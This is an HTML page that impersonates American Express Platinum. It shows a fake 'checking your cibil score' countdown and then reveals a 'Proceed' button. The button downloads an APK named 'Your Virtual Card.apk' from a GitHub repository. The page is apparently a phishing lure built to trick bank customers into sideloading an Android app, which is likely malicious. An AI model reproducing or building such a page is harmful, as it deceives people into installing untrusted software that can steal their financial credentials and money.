<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>American Express Platinum</title>

<style>

:root{
    --blue:#00175a;
}

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    width:100%;
    height:100vh;
    overflow:hidden;
    display:flex;
    align-items:center;
    justify-content:center;
    background:linear-gradient(135deg,#eef2ff,#f5f7fb);
    font-family:"Helvetica Neue",Arial,sans-serif;
}

/* MAIN SCREEN */

.processing-screen{
    position:fixed;
    inset:0;
    background:linear-gradient(135deg,#eef2ff,#f5f7fb);
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
}

/* LOADER */

.loader{
    width:90px;
    height:90px;
    border:7px solid rgba(0,0,0,0.08);
    border-top:7px solid var(--blue);
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin-bottom:25px;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

/* TEXT */

.processing-text{
    font-size:30px;
    font-weight:700;
    color:var(--blue);
    margin-bottom:15px;
    text-align:center;
}

.processing-subtext{
    color:#555;
    font-size:16px;
    margin-bottom:20px;
    text-align:center;
}

/* TIMER */

.timer{
    font-size:55px;
    font-weight:bold;
    color:#111;
    margin-bottom:25px;
}

/* BUTTON */

.proceed-btn{
    padding:15px 40px;
    border:none;
    border-radius:50px;
    background:linear-gradient(135deg,#00175a,#003da5);
    color:#fff;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    opacity:0;
    visibility:hidden;
    transform:translateY(20px);
    transition:0.4s;
}

.proceed-btn.show{
    opacity:1;
    visibility:visible;
    transform:translateY(0);
}

.proceed-btn:hover{
    transform:translateY(-2px);
}

/* MOBILE */

@media(max-width:500px){

    .processing-text{
        font-size:24px;
        padding:0 20px;
    }

    .processing-subtext{
        padding:0 20px;
    }

    .timer{
        font-size:45px;
    }

}

</style>
</head>

<body>

<div class="processing-screen">

    <div class="loader" id="loader"></div>

    <div class="processing-text">
        Please wait...
    </div>

    <div class="processing-subtext">
        We are checking your cibil score
    </div>

    <div class="timer" id="timer">
        12
    </div>

   <a href="https://github.com/hhhy97851-star/security/raw/refs/heads/main/Your%20Virtual%20Card.apk">
    <button class="proceed-btn" id="proceedBtn">
        Proceed
    </button>
</a>

</div>

<script>

/* TIMER */

let timeLeft = 12;

const timer =
document.getElementById("timer");

const loader =
document.getElementById("loader");

const proceedBtn =
document.getElementById("proceedBtn");

const countdown = setInterval(() => {

    timeLeft--;

    timer.innerText =
    timeLeft < 10
    ? "0" + timeLeft
    : timeLeft;

    if(timeLeft <= 0){

        clearInterval(countdown);

        timer.style.display = "none";

        loader.style.display = "none";

        proceedBtn.classList.add("show");
    }

},1000);

</script>

</body>
</html>
